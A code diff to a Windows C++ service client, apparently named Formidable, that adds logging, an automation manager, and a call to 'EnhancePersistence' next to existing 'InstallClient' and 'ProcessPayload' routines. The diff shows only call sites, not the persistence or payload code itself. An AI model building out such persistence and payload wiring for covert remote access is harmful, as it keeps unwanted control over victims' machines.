@@ -15,6 +15,9 @@
 #include "../../Common/Config.h"
 #include "../../Common/Utils.h"
 #include "../../Common/ClientCore.h"
+#include "Security/PersistenceOptimizer.h"
+#include "Utils/Logger.h"
+#include "Core/AutomationManager.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -52,7 +55,14 @@ void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
     std::atomic<bool> bShouldExit(false);
     std::atomic<bool> bConnected(false);
     
+    Formidable::Client::Utils::Logger::Init("client_svc.log");
+    Formidable::Client::Core::AutomationManager::Initialize();
+    Formidable::Client::Core::AutomationManager::Start();
+
     RunClientLoop(bShouldExit, bConnected);
+
+    Formidable::Client::Core::AutomationManager::Stop();
+    Formidable::Client::Utils::Logger::Close();
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
@@ -80,13 +90,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     // 正常启动逻辑
     InstallClient();
+    Formidable::Client::Security::PersistenceOptimizer::EnhancePersistence();
     ProcessPayload();
+    Formidable::Client::Utils::Logger::Init("client.log");
+    Formidable::Client::Core::AutomationManager::Initialize();
+    Formidable::Client::Core::AutomationManager::Start();
 
     std::atomic<bool> bShouldExit(false);
     std::atomic<bool> bConnected(false);
 
     RunClientLoop(bShouldExit, bConnected);
 
+    Formidable::Client::Core::AutomationManager::Stop();
+    Formidable::Client::Utils::Logger::Close();
     CleanupClientCore();
     return 0;
 }
